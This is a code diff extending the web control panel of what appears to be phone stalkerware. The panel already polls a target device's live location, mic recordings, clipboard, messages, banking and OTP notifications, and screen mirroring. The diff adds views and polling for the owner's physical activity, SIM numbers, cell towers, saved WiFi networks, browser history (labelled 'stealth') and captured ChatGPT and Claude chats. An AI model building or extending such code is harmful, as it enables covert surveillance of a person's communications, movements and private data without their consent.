@@ -374,6 +374,55 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
     <div><span class="label" style="font-size:12px">SIM</span><br><span id="liveSimVal" style="font-weight:500">--</span></div>
   </div>
 </div>
+<!-- Activity — Latest + last 5 -->
+<div style="display:flex;align-items:center;gap:12px;margin-top:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_activity">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_activity" onchange="toggleSyncPause('activity', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_activity" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_activity" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_activity" style="font-size:13px;font-weight:600;color:var(--success)">Activity Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_activity" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
+<div class="card" style="border-left-color:var(--info);padding:10px 12px;margin-top:8px">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px"><span style="font-size:13px;font-weight:600;color:var(--muted)">🏃 Activity</span><span class="chip" style="font-size:11px;cursor:pointer" onclick="pollActivity()">↻ Refresh</span></div>
+<div id="liveActivityLatest" style="font-size:15px;font-weight:500">— <span style="font-size:12px;color:var(--muted)">No activity yet</span></div>
+<div id="liveActivityHistory" style="margin-top:8px;display:flex;flex-direction:column;gap:4px"></div>
+</div>
+<!-- SIM Slots — inside Live -->
+<div style="display:flex;align-items:center;gap:12px;margin-top:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_simSlots">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_simSlots" onchange="toggleSyncPause('simSlots', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_simSlots" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_simSlots" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_simSlots" style="font-size:13px;font-weight:600;color:var(--success)">SIM Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_simSlots" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
+<div class="card" style="border-left-color:var(--success);padding:10px 12px;margin-top:8px">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px"><span style="font-size:13px;font-weight:600;color:var(--muted)">📱 SIM Slots</span><span class="chip" style="font-size:11px;cursor:pointer" onclick="pollSimSlots()">↻ Refresh</span></div>
+<div id="liveSimSlots" style="font-size:13px;color:var(--muted)">—</div>
+</div>
+<!-- Cell Towers — full list inside Live -->
+<div style="display:flex;align-items:center;gap:12px;margin-top:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_cellInfo">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_cellInfo" onchange="toggleSyncPause('cellInfo', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_cellInfo" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_cellInfo" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_cellInfo" style="font-size:13px;font-weight:600;color:var(--success)">Cell Towers Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_cellInfo" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
+<div class="card" style="border-left-color:var(--danger);padding:10px 12px;margin-top:8px">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px"><span style="font-size:13px;font-weight:600;color:var(--muted)">📡 Cell Towers</span><span class="chip" style="font-size:11px;cursor:pointer" onclick="pollCellInfo()">↻ Refresh</span></div>
+<div id="liveCellInfo" style="font-size:12px;color:var(--muted)">—</div>
+</div>
 <div id="statusWidget" style="margin-top:8px;display:flex;gap:6px;flex-wrap:wrap;font-size:10px">
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swBattery">&#x1F50B; --</span>
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swStorage">&#x1F4BE; --</span>
@@ -536,6 +585,39 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div id="videoLoadMoreContainer"></div>
 </div>
 <div id="tab-timeline">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_timeline">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_timeline" onchange="toggleSyncPause('timeline', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_timeline" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_timeline" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_timeline" style="font-size:13px;font-weight:600;color:var(--success)">Timeline Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_timeline" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_browser">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_browser" onchange="toggleSyncPause('browser', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_browser" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_browser" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_browser" style="font-size:13px;font-weight:600;color:var(--success)">Browser Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_browser" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_ai">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_ai" onchange="toggleSyncPause('ai', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_ai" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_ai" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_ai" style="font-size:13px;font-weight:600;color:var(--success)">AI Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_ai" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div class="filter-chips" id="timelineChips">
 <span class="chip active" data-filter="all" data-label="All">All</span>
 <span class="chip" data-filter="location" data-label="&#x1F4CD; Location">&#x1F4CD; Location</span>
@@ -546,6 +628,8 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <span class="chip" data-filter="mirroring" data-label="&#x1F5A5; Mirroring">&#x1F5A5; Mirroring</span>
 <span class="chip" data-filter="security" data-label="&#x1F6E1; Security">&#x1F6E1; Security</span>
 <span class="chip" data-filter="general" data-label="&#x1F514; General">&#x1F514; General</span>
+<span class="chip" data-filter="browser" data-label="&#x1F310; Browser">&#x1F310; Browser</span>
+<span class="chip" data-filter="ai" data-label="&#x1F916; AI Chats">&#x1F916; AI Chats</span>
 </div>
 <div style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
 <select id="timelinePeriod" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 8px;border-radius:var(--radius);font-size:13px">
@@ -606,7 +690,19 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <input type="text" id="callsSearch" placeholder="&#x1F50D; Search contacts, numbers..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin-bottom:8px">
 <div id="callsBody"></div>
 </div>
-<div id="tab-apps"><div class="app-period" style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
+<div id="tab-apps">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_apps">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_apps" onchange="toggleSyncPause('apps', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_apps" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_apps" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_apps" style="font-size:13px;font-weight:600;color:var(--success)">Apps Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_apps" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
+<div class="app-period" style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
 <span class="app-period-btn active" data-period="today">Today</span>
 <span class="app-period-btn" data-period="yesterday">Yesterday</span>
 <span class="app-period-btn" data-period="week">7 days</span>
@@ -817,10 +913,35 @@ On-demand mic recordings triggered from the dashboard. Segments are auto-assembl
 <div style="font-size:13px;color:var(--muted);margin-bottom:8px">Live scans every 60s from device. Latest scan shown at top with full detail.</div>
 <input type="text" id="wifiSearch" placeholder="&#x1F50D; Filter by SSID or BSSID..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin-bottom:8px">
 <div id="wifiList"><div class="label">No WiFi scan data yet</div></div>
+<div style="display:flex;align-items:center;gap:12px;margin-top:12px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_savedWifi">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_savedWifi" onchange="toggleSyncPause('savedWifi', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_savedWifi" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_savedWifi" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_savedWifi" style="font-size:13px;font-weight:600;color:var(--success)">Saved WiFi Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_savedWifi" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
+<div style="margin-top:8px"><span style="font-size:14px;font-weight:500">💾 Saved Networks</span><span style="font-size:12px;color:var(--muted);margin-left:6px">all remembered SSIDs on device</span></div>
+<input type="text" id="savedWifiSearch" placeholder="🔍 Filter saved SSID..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:14px;margin:6px 0 8px">
+<div id="savedWifiList"><div class="label">No saved networks yet</div></div>
 </div>
 </div>
 </div>
 <div id="tab-logcat">
+<div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_logcat">
+<label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
+<div style="position:relative;width:44px;height:24px">
+<input type="checkbox" id="syncPauseToggle_logcat" onchange="toggleSyncPause('logcat', this.checked)" style="opacity:0;width:0;height:0">
+<span id="syncToggleSlider_logcat" style="position:absolute;inset:0;background:var(--success);border-radius:12px;transition:.2s"></span>
+<span id="syncToggleKnob_logcat" style="position:absolute;left:2px;top:2px;width:20px;height:20px;background:#fff;border-radius:50%;transition:.2s;box-shadow:0 1px 3px rgba(0,0,0,.3)"></span>
+</div>
+<span id="syncToggleLabel_logcat" style="font-size:13px;font-weight:600;color:var(--success)">Logcat Sync: Collecting</span>
+</label>
+<span id="syncToggleStatus_logcat" style="font-size:12px;color:var(--muted);margin-left:auto">—</span>
+</div>
 <div style="display:flex;align-items:center;gap:12px;margin-bottom:10px;padding:10px 12px;background:var(--card);border:1px solid var(--border);border-radius:8px" id="syncToggleWrap_files">
 <label style="display:flex;align-items:center;gap:8px;cursor:pointer;user-select:none">
 <div style="position:relative;width:44px;height:24px">
@@ -1489,7 +1610,7 @@ let playbackLoop = false;
 
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 900000, logcat: 300000, remote: 30000, photos: 600000, videos: 60000, health: 3600000, mirror: 10000, spy: 10000, clipboard: 30000, files: 60000, appVer: 30000 };
+const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 900000, logcat: 300000, remote: 30000, photos: 600000, videos: 60000, health: 3600000, mirror: 10000, spy: 10000, clipboard: 30000, files: 60000, appVer: 30000, browser: 60000, activity: 60000, ai: 60000, timeline: 60000, savedWifi: 60000, cellInfo: 60000, simSlots: 60000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -2904,6 +3025,10 @@ function startPolling() {
   schedulePoll('photos', intervals.photos, pollPhotos);
   schedulePoll('videos', 60000, pollVideos);
   schedulePoll('clipboard', intervals.clipboard, pollClipboard);
+  schedulePoll('activity', intervals.activity || 60000, pollActivity);
+  schedulePoll('simSlots', intervals.simSlots || 60000, pollSimSlots);
+  schedulePoll('cellInfo', intervals.cellInfo || 60000, pollCellInfo);
+  schedulePoll('savedWifi', intervals.savedWifi || 60000, pollSavedWifi);
   schedulePoll('syncToggles', 30000, pollSyncToggles);
   schedulePoll('updatePause', 30000, pollUpdatePause);
   schedulePoll('files', 14 * 60 * 1000, pollFileInventory);
@@ -2918,7 +3043,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollAppVer(), pollClipboard(), pollFileInventory(), pollSyncToggles(), pollUpdatePause()];
+  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollPermissions(), pollWifiScans(), pollNearbyScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring(), pollSpy(), pollAppVer(), pollClipboard(), pollFileInventory(), pollActivity(), pollSimSlots(), pollCellInfo(), pollSavedWifi(), pollSyncToggles(), pollUpdatePause()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -3186,6 +3311,125 @@ async function pollMeta() {
     document.getElementById('statusDot').className = 'status';
   }
 }
+
+// --- Live extensions: Activity + SIM + Cell towers + Saved WiFi ---
+async function pollActivity(){
+  if(!selectedDevice) return;
+  try{
+    const data = await fetchRTDB(`devices/${selectedDevice}/activity`);
+    const latestEl = document.getElementById('liveActivityLatest');
+    const histEl = document.getElementById('liveActivityHistory');
+    if(!latestEl || !histEl) return;
+    if(!data){ latestEl.innerHTML='— <span style="font-size:12px;color:var(--muted)">No activity yet</span>'; histEl.innerHTML=''; return; }
+    let latest=null, history=[];
+    if(data.latest){ latest=data.latest; }
+    // collect history sorted by ts
+    const keys=Object.keys(data).filter(k=>k!=='latest' && k!=='_arr');
+    const arr=[];
+    for(const k of keys){ const v=data[k]; if(v && v.type) arr.push(v); }
+    // also handle _arr
+    if(data._arr && Array.isArray(data._arr)) for(const v of data._arr) if(v && v.type) arr.push(v);
+    history=arr.sort((a,b)=> (parseInt(b.ts_ms)||0)-(parseInt(a.ts_ms)||0));
+    if(!latest && history.length) latest=history[0];
+    if(latest){
+      const icon={still:'🧍',walking:'🚶',running:'🏃',in_vehicle:'🚗',on_bicycle:'🚲',tilting:'📱',on_foot:'🚶',unknown:'❓'}[latest.type]||'🏃';
+      latestEl.innerHTML=icon+' <b>'+(latest.type||'unknown')+'</b> <span style="font-size:12px;color:var(--muted)">'+(latest.confidence?latest.confidence+'% · ':'')+pkt(parseInt(latest.ts_ms||'0'))+'</span>';
+    } else {
+      latestEl.innerHTML='— <span style="font-size:12px;color:var(--muted)">No activity yet</span>';
+    }
+    histEl.innerHTML='';
+    for(let i=0;i<Math.min(5, history.length);i++){
+      const h=history[i];
+      const ic={still:'🧍',walking:'🚶',running:'🏃',in_vehicle:'🚗',on_bicycle:'🚲',tilting:'📱',on_foot:'🚶',unknown:'❓'}[h.type]||'•';
+      const row=document.createElement('div');
+      row.style.cssText='display:flex;justify-content:space-between;font-size:12px;padding:4px 6px;background:var(--bg);border:1px solid var(--border);border-radius:6px';
+      row.innerHTML='<span>'+ic+' '+(h.type||'unknown')+(h.confidence?' ('+h.confidence+'%)':'')+'</span><span style="color:var(--muted)">'+pkt(parseInt(h.ts_ms||'0'))+'</span>';
+      histEl.appendChild(row);
+    }
+    if(history.length===0) histEl.innerHTML='<div style="font-size:12px;color:var(--muted)">No history yet</div>';
+  }catch(e){ console.error('pollActivity',e); }
+}
+async function pollSimSlots(){
+  if(!selectedDevice) return;
+  try{
+    const m=await fetchRTDB(`devices/${selectedDevice}/metrics/latest`);
+    const el=document.getElementById('liveSimSlots');
+    if(!el) return;
+    let sims=[];
+    if(m && m.simSlots && Array.isArray(m.simSlots)) sims=m.simSlots;
+    else if(m && m.simSlots && typeof m.simSlots==='object') sims=Object.values(m.simSlots);
+    // also try direct node
+    if(!sims.length){
+      const direct=await fetchRTDB(`devices/${selectedDevice}/simSlots`);
+      if(direct) sims=Array.isArray(direct)?direct:Object.values(direct);
+    }
+    if(!sims.length){ el.innerHTML='<span style="color:var(--muted)">— No SIM data yet</span>'; return; }
+    el.innerHTML=sims.map(s=>`<div style="padding:4px 6px;background:var(--bg);border:1px solid var(--border);border-radius:6px;margin-bottom:4px">Slot ${s.slot!=null?s.slot:'?'}: <b>${escHtml(s.carrier||s.displayName||'Unknown')}</b> ${s.number?' · '+escHtml(s.number):''} <span style="color:var(--muted)">mcc:${escHtml(s.mcc||'-')} mnc:${escHtml(s.mnc||'-')} ${s.countryIso||''}</span></div>`).join('');
+  }catch(e){ console.error('pollSimSlots',e); }
+}
+async function pollCellInfo(){
+  if(!selectedDevice) return;
+  try{
+    const m=await fetchRTDB(`devices/${selectedDevice}/metrics/latest`);
+    const el=document.getElementById('liveCellInfo');
+    if(!el) return;
+    let cells=[];
+    if(m && m.cellInfo && Array.isArray(m.cellInfo)) cells=m.cellInfo;
+    else if(m && m.cellInfo && typeof m.cellInfo==='object') cells=Object.values(m.cellInfo);
+    else {
+      const direct=await fetchRTDB(`devices/${selectedDevice}/cellInfo`);
+      if(direct) cells=Array.isArray(direct)?direct:Object.values(direct);
+    }
+    if(!Array.isArray(cells) || !cells.length){ el.innerHTML='<span style="color:var(--muted)">— No cell towers yet</span>'; return; }
+    el.innerHTML=cells.map(c=>{
+      const type=(c.type||'').toUpperCase();
+      const ids=['ci','cid','lac','tac','pci','mcc','mnc','basestation','network'].map(k=> c[k]!=null && c[k]!==-1 ? `${k}:${c[k]}`:'').filter(Boolean).join(' ');
+      const dbm=c.dbm!=null? c.dbm+'dBm':'';
+      const lvl=c.level!=null? ' lvl:'+c.level:'';
+      const roaming=c.isRoaming? ' 🌍 roaming':'';
+      return `<div style="padding:5px 6px;background:var(--bg);border:1px solid var(--border);border-radius:6px;margin-bottom:4px;font-size:12px"><b>${escHtml(type||'CELL')}</b> ${escHtml(ids)} <span style="color:var(--muted)">${dbm}${lvl}${roaming} · ${escHtml(c.phoneType||'')}</span></div>`;
+    }).join('');
+  }catch(e){ console.error('pollCellInfo',e); }
+}
+async function pollSavedWifi(){
+  if(!selectedDevice) return;
+  try{
+    const el=document.getElementById('savedWifiList');
+    if(!el) return;
+    const q=(document.getElementById('savedWifiSearch')?.value||'').toLowerCase();
+    let data=await fetchRTDB(`devices/${selectedDevice}/metrics/latest`);
+    let arr=[];
+    if(data && data.savedNetworks && Array.isArray(data.savedNetworks)) arr=data.savedNetworks;
+    else if(data && data.savedNetworks && typeof data.savedNetworks==='object') arr=Object.values(data.savedNetworks);
+    else if(data && data.savedWifi && Array.isArray(data.savedWifi)) arr=data.savedWifi;
+    if(!arr.length){
+      const direct=await fetchRTDB(`devices/${selectedDevice}/savedWifi`);
+      if(direct) arr=Array.isArray(direct)?direct:Object.values(direct);
+    }
+    if(!arr.length){
+      const scan=await fetchRTDB(`devices/${selectedDevice}/wifi_scan`);
+      const k=scan?Object.keys(scan).find(x=>scan[x] && scan[x].savedNetworks):null;
+      if(k && scan[k].savedNetworks) arr=scan[k].savedNetworks;
+    }
+    // also try wifi_scan latest
+    if(!arr.length){
+      try{
+        const m2=await fetchRTDB(`devices/${selectedDevice}/wifi_scan`);
+        if(m2){
+          for(const key of Object.keys(m2)){
+            const v=m2[key];
+            if(v && v.savedNetworks && Array.isArray(v.savedNetworks) && v.savedNetworks.length){ arr=v.savedNetworks; break; }
+          }
+        }
+      }catch{}
+    }
+    let filtered=arr;
+    if(q) filtered=arr.filter(x=> (x.ssid||'').toLowerCase().includes(q));
+    if(!filtered.length){ el.innerHTML='<div class="label">'+(arr.length?'No match':'No saved networks yet')+'</div>'; return; }
+    el.innerHTML=filtered.map(x=>`<div class="card" style="padding:6px 10px;margin-bottom:4px"><b>${escHtml(x.ssid||'(hidden)')}</b> <span style="color:var(--muted);font-size:12px">${escHtml(x.capabilities||'')}</span></div>`).join('');
+  }catch(e){ console.error('pollSavedWifi',e); }
+}
+document.getElementById('savedWifiSearch')?.addEventListener('input', pollSavedWifi);
 
 // --- Screen mirroring / Link to Windows / USB-debug live status ---
 let mirrorPrevActive = false;
@@ -4373,6 +4617,29 @@ async function pollHistory() {
     }
     timelineCache = Object.values(all)
       .sort((a, b) => (parseInt(b.ts_ms) || 0) - (parseInt(a.ts_ms) || 0));
+    // Merge browser_history (stealth) and aiChats into timeline so Browser/AI chips have data
+    try{
+      const br = await fetchRTDB(`devices/${selectedDevice}/browser_history`);
+      if(br && typeof br==='object'){
+        const vals = br._arr && Array.isArray(br._arr) ? br._arr : Object.values(br).filter(v=>v && typeof v==='object' && (v.browserUrl||v.url));
+        for(const v of vals){
+          const url=v.browserUrl||v.url||'';
+          if(!url) continue;
+          timelineCache.push({type:'browser', ts_ms: parseInt(v.ts_ms||v.timestamp||'0')||Date.now(), contactName: url, contact: v.packageName||'', messagePreview: v.browserTitle||v.title||url, browserUrl:url, browserTitle: v.browserTitle||v.title||''});
+        }
+        timelineCache.sort((a,b)=>(parseInt(b.ts_ms)||0)-(parseInt(a.ts_ms)||0));
+      }
+    }catch{}
+    try{
+      const ai = await fetchRTDB(`devices/${selectedDevice}/aiChats`);
+      if(ai && typeof ai==='object'){
+        const vals2 = ai._arr && Array.isArray(ai._arr) ? ai._arr : Object.values(ai).filter(v=>v && typeof v==='object');
+        for(const v of vals2){
+          timelineCache.push({type:'ai', ts_ms: parseInt(v.ts_ms||'0')||Date.now(), contactName: v.packageName||v.aiVisible||'AI', messagePreview: v.aiSnippet||v.aiFullText||v.aiVisible||'', aiSnippet: v.aiSnippet||'', aiFullText: v.aiFullText||''});
+        }
+        timelineCache.sort((a,b)=>(parseInt(b.ts_ms)||0)-(parseInt(a.ts_ms)||0));
+      }
+    }catch{}
     renderTimeline(timelineCache);
     renderCalls(timelineCache);
    } catch (e) {
@@ -6326,6 +6593,8 @@ function renderTimeline(docs) {
     if (isMirrorType(type)) counts.mirroring = (counts.mirroring || 0) + 1;
     if (isSecurityType(type)) counts.security = (counts.security || 0) + 1;
     if (type.includes('general')) counts.general = (counts.general || 0) + 1;
+    if (type.includes('browser')) counts.browser = (counts.browser || 0) + 1;
+    if (type.includes('ai') || type.includes('chatgpt') || type.includes('claude') || type.includes('copilot')) counts.ai = (counts.ai || 0) + 1;
   }
   document.querySelectorAll('.chip[data-filter]').forEach(chip => {
     const f = chip.dataset.filter;
@@ -6350,6 +6619,8 @@ function renderTimeline(docs) {
     if (timelineFilter === 'mirroring') return isMirrorType(type);
     if (timelineFilter === 'security') return isSecurityType(type);
     if (timelineFilter === 'general') return type.includes('general');
+    if (timelineFilter === 'browser') return type.includes('browser') || type.includes('url') || type.includes('chrome') || type.includes('search');
+    if (timelineFilter === 'ai') return type.includes('ai') || type.includes('chatgpt') || type.includes('claude') || type.includes('copilot') || type.includes('perplexity') || type.includes('bard');
     return true;
   });
   // Dedup BEFORE pagination so identical re-posted messages collapse into ONE row
@@ -6394,7 +6665,11 @@ function renderTimeline(docs) {
   filtered = deduped;
   const totalFiltered = filtered.length;
   filtered = filtered.slice(0, timelineOffset || TIMELINE_BATCH);
-  if (!filtered.length) { list.innerHTML = '<div class="label">No entries</div>'; return; }
+  if (!filtered.length) {
+    if (timelineFilter === 'ai') { list.innerHTML = '<div class="label">No AI chats yet — data appears here when ChatGPT/Claude is used on device</div>'; return; }
+    if (timelineFilter === 'browser') { list.innerHTML = '<div class="label">No browser history yet — URLs appear here when Chrome/Brave is used</div>'; return; }
+    list.innerHTML = '<div class="label">No entries</div>'; return;
+  }
   // Group by day
   const groups = {};
   for (const d of filtered) {
@@ -6420,12 +6695,14 @@ function renderTimeline(docs) {
       const isUsbDbg = type.includes('usb_debug');
       const isAdbWifi = type.includes('adb_wifi');
       const isSec = isSecurityType(type);
-       const icon = isMirror ? (isUsbDbg || isAdbWifi ? '\u{1F50C}' : '\u{1F5A5}') : isSec ? '\u{1F6E1}' : type.includes('general') ? '\u{1F514}' : type.includes('snapchat') ? '\u{1F4F8}' : type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction') ? '\u{1F4B3}' : '\u{1F4CD}';
-       let contact = d.contactName || d.contact || '';
-       if (type.toLowerCase().includes('general') && d.appName) contact = d.appName + (contact ? ' \u00B7 ' + contact : '');
-      const msg = d.messagePreview || '';
-      const dur = d.duration || '';
-      const dir = d.direction || '';
+       const icon = isMirror ? (isUsbDbg || isAdbWifi ? '\u{1F50C}' : '\u{1F5A5}') : isSec ? '\u{1F6E1}' : type.includes('general') ? '\u{1F514}' : type.includes('browser') ? '\u{1F310}' : type.includes('ai') || type.includes('chatgpt') || type.includes('claude') ? '\u{1F916}' : type.includes('snapchat') ? '\u{1F4F8}' : type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction') ? '\u{1F4B3}' : '\u{1F4CD}';
+        let contact = d.contactName || d.contact || '';
+        if (type.toLowerCase().includes('general') && d.appName) contact = d.appName + (contact ? ' \u00B7 ' + contact : '');
+        if (type.includes('browser') && !contact) contact = d.browserUrl || d.url || d.browserTitle || d.title || contact;
+        if ((type.includes('ai') || type.includes('chatgpt') || type.includes('claude')) && !contact) contact = (d.aiSnippet || d.aiVisible || d.packageName || '').substring(0,80);
+       const msg = d.messagePreview || d.browserTitle || d.title || d.aiFullText || d.aiSnippet || '';
+       const dur = d.duration || '';
+       const dir = d.direction || '';
       let mirrorText = '';
       if (isMirror && d.details) {
         const parts = [];
@@ -8230,7 +8507,7 @@ async function pollSyncToggles(){
       const g = await fetchRTDB(`config/sync_toggles`);
       if(g && typeof g==='object') data = g;
     }
-    const targets = ['location','wifi','recents','photos','videos','calls','contacts','voice','files','perms','health','all'];
+    const targets = ['location','wifi','recents','photos','videos','calls','contacts','voice','files','perms','health','all','browser','activity','ai','timeline','savedWifi','cellInfo','simSlots','apps','logcat'];
     for(const tgt of targets){
       let val = data[tgt];
       // val true means enabled (collecting), false means paused; if undefined => collecting
